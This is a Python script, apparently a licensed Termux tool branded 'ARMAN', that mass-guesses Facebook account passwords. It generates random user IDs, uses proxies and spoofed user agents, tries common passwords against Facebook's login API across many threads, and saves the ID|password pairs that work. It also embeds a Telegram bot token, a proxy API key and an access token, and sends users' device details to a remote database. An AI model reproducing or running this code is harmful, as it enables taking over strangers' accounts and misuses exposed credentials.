import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
import warnings
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime, timedelta

warnings.filterwarnings("ignore", category=SyntaxWarning)

modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

FIREBASE_URL = "https://noorsalan-dab42-default-rtdb.firebaseio.com/Noor/"

BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
TELEGRAM_USER = "8568795915"

# --- WEBSHARE PROXY SETUP ---
PROXY_API_URL = "https://proxy.webshare.io/api/v2/proxy/list/download/pbkklilmdcfijgtsxqtmfadbewtkpjbbzugqjoet/-/any/username/direct/-/?plan_id=14073595"

def get_live_proxy():
    try:
        res = requests.get(PROXY_API_URL, timeout=5)
        if res.status_code == 200:
            proxies_list = res.text.strip().splitlines()
            if proxies_list:
                p = random.choice(proxies_list)
                return {
                    'http': f'http://{p}',
                    'https': f'http://{p}'
                }
    except Exception:
        pass
    return None

def get_server_version():
    try:
        url = "https://noorsalan-dab42-default-rtdb.firebaseio.com/Noor/Version.json"
        response = requests.get(url, timeout=5)
        server_version = response.json()
        if server_version:
            return str(server_version).strip()
    except Exception:
        pass
    return "15.4"

def check_update():
    try:
        url = "https://arman-f9a3b-default-rtdb.firebaseio.com/123/Version.json"
        response = requests.get(url, timeout=5)
        server_version = response.json()
        
        current_version = "15.4"
        
        if server_version and str(server_version).strip() != str(current_version).strip():
            print("\n\x1b[38;5;196m========================================\033[0m")
            print("\x1b[38;5;226m [!] New Version Available on Server!\033[0m")
            print(f"\x1b[38;5;46m [✓] Updating Tool to Version: {server_version}\033[0m")
            print("\x1b[38;5;51m [i] Please wait, downloading latest code...\033[0m")
            print("\x1b[38;5;196m========================================\033[0m")
            
            os.system('git pull origin main > /dev/null 2>&1 || git pull > /dev/null 2>&1')
            print("\n\x1b[38;5;46m[✓] Tool Updated Successfully! Restarting...\033[0m")
            time.sleep(2)
            os.execv(sys.executable, ['python'] + sys.argv)
    except Exception:
        pass

def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
        model = os.popen("getprop ro.product.model").read().strip()
        if brand and model:
            if brand.lower() in model.lower():
                return model
            return f"{brand} {model}"
        elif model:
            return model
        elif brand:
            return brand
    except Exception:
        pass
    return "Unknown Device"

def get_android_version():
    try:
        return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
    except Exception:
        return "Unknown"

def get_hwid():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()
        device = os.popen("getprop ro.product.device").read().strip()
        if brand or model or device:
            combined = f"{brand}_{model}_{device}"
            if len(combined.strip("_")) > 2:
                return combined
    except Exception:
        pass
    try:
        android_id = os.popen("settings get secure android_id").read().strip()
        if android_id and android_id != "null":
            return f"AND_ID_{android_id}"
    except Exception:
        pass
    try:
        return platform.node() + "_" + platform.machine()
    except Exception:
        return "ARMAN_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def record_user_daily_usage(user_key):
    try:
        today_date = datetime.now().strftime("%Y-%m-%d")
        usage_path = f"{FIREBASE_URL}keys/{user_key}/daily_usage/{today_date}.json"
        res = requests.get(usage_path, timeout=3)
        current_count = res.json()
        if current_count and isinstance(current_count, int):
            new_count = current_count + 1
        else:
            new_count = 1
        requests.put(usage_path, json=new_count, timeout=3)
    except Exception:
        pass

def send_login_alert(user_key, user_name, expiry_date):
    device_name = get_device_model()
    android_ver = get_android_version()
    message = (
        "🔥 NEW USER / TRIAL ACTIVATED!\n"
        "━━━━━━━━━━━━━━━━━━\n"
        f"👤 Customer Name: {user_name}\n"
        f"🔑 Key / Trial Code: {user_key}\n"
        f"📱 Device Model: {device_name}\n"
        f"🤖 Android Ver: {android_ver}\n"
        f"⏰ Expiry Date: {expiry_date}\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_USER, "text": message}
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception:
        pass

def calculate_time_left(expiry_str):
    if not expiry_str:
        return expiry_str
    try:
        try:
            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
        except Exception:
            exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d")
        now = datetime.now()
        diff = exp_dt - now
        total_seconds = diff.total_seconds()
        if total_seconds <= 0: 
            return "Expired"
        total_hours = int(total_seconds // 3600)
        minutes = int((total_seconds % 3600) // 60)
        if total_hours < 24:
            return f"{total_hours}h {minutes}m Left"
        else:
            days = total_hours // 24
            rem_hours = total_hours % 24
            return f"{days}d {rem_hours}h {minutes}m Left"
    except Exception:
        return expiry_str

def display_welcome_banner(user_name, user_key, time_left):
    os.system('clear')
    print(f"""
\033[1;32m╔════════════════════════════════════════════╗
║             ARMAN TOOL ACTIVE              ║
╠════════════════════════════════════════════╣
║ USER NAME    : {user_name:<27} ║
║ LICENSED KEY : {user_key:<27} ║
║ VALIDITY     : {time_left:<27} ║
║ SYSTEM STATUS: ONLINE & READY              ║
╚════════════════════════════════════════════╝\033[0m
""")

def check_key():
    check_update()
    try:
        for m_node in ["maintenance.json", "maintenance_mode.json"]:
            m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
            m_status = m_res.json()
            if m_status in ("ON", True, "True", 1, "1"):
                os.system('clear')
                print("\n\033[1;31m[!] SYSTEM IS UNDER MAINTENANCE / BLOCKED BY ADMIN!\033[0m")
                print("\033[1;33m[!] Please try again later.\033[0m\n")
                sys.exit()
    except Exception:
        pass

    saved_key_file = "/data/data/com.termux/files/home/.arm_key.txt"
    try:
        if not os.path.exists("/data/data/com.termux"):
            import pathlib
            saved_key_file = os.path.join(str(pathlib.Path.home()), ".arm_key.txt")
    except Exception:
        pass
        
    user_hwid = get_hwid()
    user_key = None
    
    if os.path.exists(saved_key_file):
        try:
            with open(saved_key_file, "r") as f:
                user_key = f.read().strip().upper()
        except Exception:
            user_key = None

    key_data = None
    is_valid = False

    if user_key:
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                expiry_str = key_data.get('expiry')
                saved_hwid = key_data.get('hwid')
                if saved_hwid in ("None", "", None):
                    requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={'hwid': user_hwid})
                    saved_hwid = user_hwid
                now_str = datetime.now().strftime("%Y-%m-%d %H:%M")
                if expiry_str != "Lifetime" and expiry_str < now_str:
                    print("\n\033[1;31m[×] Your Key / Free Trial has Expired! Please buy a Paid Key.\033[0m")
                    if os.path.exists(saved_key_file): os.remove(saved_key_file)
                    user_key = None
                else:
                    if saved_hwid in (user_hwid, "None", "", None):
                        is_valid = True
                    else:
                        if os.path.exists(saved_key_file): 
                            os.remove(saved_key_file)
                        user_key = None
        except Exception:
            pass

    if not is_valid:
        try:
            safe_hwid_node = user_hwid.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_").replace("/", "_")
            trial_check_res = requests.get(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", timeout=10)
            already_took_trial = trial_check_res.json()
            if already_took_trial is True:
                pass
            else:
                requests.put(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", json=True)
                trial_key = "TRL-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                expiry_date = (datetime.now() + timedelta(days=2)).strftime('%Y-%m-%d %H:%M')
                customer_name = "Auto_Trial_User"
                device_model = get_device_model()
                android_ver = get_android_version()
                payload = {
                    'name': customer_name,
                    'expiry': expiry_date,
                    'hwid': user_hwid,
                    'device_model': device_model,
                    'android_version': android_ver,
                    'app_version': '1.0'
                }
                requests.put(f"{FIREBASE_URL}keys/{trial_key}.json", json=payload)
                send_login_alert(trial_key, customer_name, expiry_date)
                try:
                    with open(saved_key_file, "w") as f: 
                        f.write(trial_key)
                except Exception:
                    pass
                print(f"\n\033[1;32m[✓] NEW USER 2 DAYS FREE APPROVAL 🔥\033[0m")
                time.sleep(2)
                user_key = trial_key
                key_data = payload
                is_valid = True
        except Exception:
            pass

    if not is_valid:
        if os.path.exists(saved_key_file):
            try: os.remove(saved_key_file)
            except Exception: pass
        os.system('clear')
        print("""\033[1;33m
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃               [!] ACCESS DENIED                 ┃
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ YOUR FREE TRIAL HAS ENDED                       ┃
┃ Please contact ARMAN to get your Key!           ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m""")
        customer_name = input("\033[1;33m[?] Enter Your Name: \033[0m").strip().upper()
        if not customer_name: 
            customer_name = "USER"
        user_key = input("\n\033[1;36m[?] Enter Your Key: \033[0m").strip().upper()
        try:
            res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
            key_data = res.json()
            if key_data and isinstance(key_data, dict):
                expiry_str = key_data.get('expiry')
                saved_hwid = key_data.get('hwid')
                if saved_hwid and saved_hwid not in ("None", "") and saved_hwid != user_hwid:
                    print("\n\033[1;31m[×] Key is registered to another device!\033[0m")
                    sys.exit()
                device_model = get_device_model()
                android_ver = get_android_version()
                requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={
                    'hwid': user_hwid, 
                    'name': customer_name,
                    'device_model': device_model,
                    'android_version': android_ver,
                    'app_version': '1.0'
                })
                send_login_alert(user_key, customer_name, expiry_str)
                try:
                    with open(saved_key_file, "w") as f: 
                        f.write(user_key)
                except Exception:
                    pass
                is_valid = True
            else:
                print("\n\033[1;31m[×] Invalid Key! Key not found in database.\033[0m")
                sys.exit()
        except Exception as e:
            print(f"\n\033[1;31m[×] Connection Error: {e}\033[0m")
            sys.exit()

    if is_valid and key_data:
        record_user_daily_usage(user_key)
        return key_data.get("name", "USER"), user_key, key_data.get('expiry')
    return None

method = []
oks = []
cps = []
loop = 0
user = []

X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'

def window1():
    android_versions = ["13.0", "14.0", "15.0", "16.0"]
    devices = [
        "Samsung Galaxy S24 Ultra", "Samsung Galaxy S25", "Xiaomi 14 Pro", 
        "Google Pixel 8 Pro", "Google Pixel 9", "OnePlus 12", "Vivo X100"
    ]
    fb_versions = ["440.0.0.32.118", "450.0.0.25.75", "460.0.0.40.90", "471.0.0.35.100"]
    
    ua_type = random.choice([1, 2, 3])
    
    if ua_type == 1:
        av = random.choice(fb_versions)
        an_ver = random.choice(android_versions)
        dev = random.choice(devices)
        return f"Dalvik/2.1.0 (Linux; U; Android {an_ver}; {dev} Build/UP1A.{random.randint(200000,900000)}.{random.randint(100,999)}) [FBAN/FB4A;FBAV/{av};FBBV/{random.randint(500000000,650000000)};FBDM{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBRV/{random.randint(500000000,650000000)};FBCR/Jazz;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/{dev.replace(' ', '_')};FBSV/{an_ver};FBOP/1;FBCA/arm64-v8a:;]"
    elif ua_type == 2:
        chrome_ver = random.choice(range(120, 142))
        an_ver = random.choice(android_versions)
        return f"Mozilla/5.0 (Linux; Android {an_ver}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{random.randint(4000,7000)}.{random.randint(50,200)} Mobile Safari/537.36"
    else:
        chrome_ver = random.choice(range(125, 142))
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver}.0.{random.randint(4000,7000)}.{random.randint(50,200)} Safari/537.36"

sys.stdout.write('\x1b]2;{ Arman 👑 }\x07')

def show_branding():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    current_ver = get_server_version()

    print(r"""\033[1;32m
      _    ____  ____  __  __    _    _   _ 
     / \  |  _ \|  _ \|  \/  |  / \  | \ | |
    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |
   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |
  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|
\033[0m""")
               
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARMAN")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
    print(f"\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.4")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def ____banner____():
    show_branding()

def creationyear(uid):
    if uid.startswith(('1000000000', '1000000001')): return '2006'
    if uid.startswith(('1000000002', '1000000003')): return '2007'
    if uid.startswith(('1000000004', '1000000005')): return '2008'
    if len(uid) == 15:
        if uid.startswith(('100000', '100001', '100002', '100003', '100004', '100005', '100006', '100007', '100008', '100009')): return '2009'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('100001'): return '2016'
        if uid.startswith('100002'): return '2017'
        if uid.startswith('100003'): return '2018'
        if uid.startswith('100004'): return '2019'
        if uid.startswith('100005'): return '2020'
        if uid.startswith('100006'): return '2021'
        if uid.startswith(('100007', '100008')): return '2022'
        if uid.startswith('100009'): return '2023'
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    elif len(uid) == 9 and uid.startswith('61'): return '2024'
    return '2009'

def clear():
    os.system('clear')

def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def BNG_71_():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CLONE')
    linex()
    __Jihad__ = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m2009 series')
    linex()
    _input = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print("       \x1b[38;5;49mOld Code " + Y + ":" + G + " 2010-2014")
    ask = input("       \x1b[38;5;41mSELECT " + Y + ":" + G + " ")
    linex()
    ____banner____()
    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
    limit = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT " + Y + ":" + G + " ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + " " + limit + W)
        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def old_Tow():
    user = []
    ____banner____()
    print("       \x1b[38;5;49m100003/4 SERIES ACTIVE")
    limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
    linex()
    for _ in range(int(limit)):
        uid = random.choice(['100003', '100004']) + ''.join(random.choices('0123456789', k=9))
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=35) as pool:
        ____banner____()
        print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + " " + limit + W)
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def old_Tree():
    user = []
    ____banner____()
    print("       \x1b[38;5;49m2009 SERIES ACTIVE")
    limit = input("       \x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
    linex()
    for _ in range(int(limit)):
        uid = '10000000' + ''.join(random.choices('0123456789', k=7))
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
    linex()
    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
    with tred(max_workers=35) as pool:
        ____banner____()
        print("       \x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + " " + limit + W)
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-M1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', 'password', '112233', '123321', '786786', 'pakistan'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                "Host": "b-graph.facebook.com",
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Not/A)Brand";v="99", "Google Chrome";v="125", "Chromium";v="125"',
                "Sec-Ch-Ua-Mobile": "?1",
                "Sec-Ch-Ua-Platform": '"Android"',
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": window1(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "X-Requested-With": "com.facebook.katana",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
            }
            proxy = get_live_proxy()
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, proxies=proxy, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)

def login_2(uid):
    global loop
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mARMAN-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    for pw in ('123456', '123123', '1234567', '12345678', '123456789', 'pakistan', '786786'):
        try:
            with requests.Session() as session:
                headers = {
                    "Host": "b-api.facebook.com",
                    "User-Agent": window1(),
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9"
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                proxy = get_live_proxy()
                po = session.get(url, headers=headers, proxies=proxy).json()
                if 'session_key' in str(po):
                    print(f"\r\r(\x1b[1;37mARMAN-OLD\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/ARMAN-OLD-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception:
            pass
    loop += 1

if __name__ == '__main__':
    result = check_key()
    if result:
        BNG_71_()
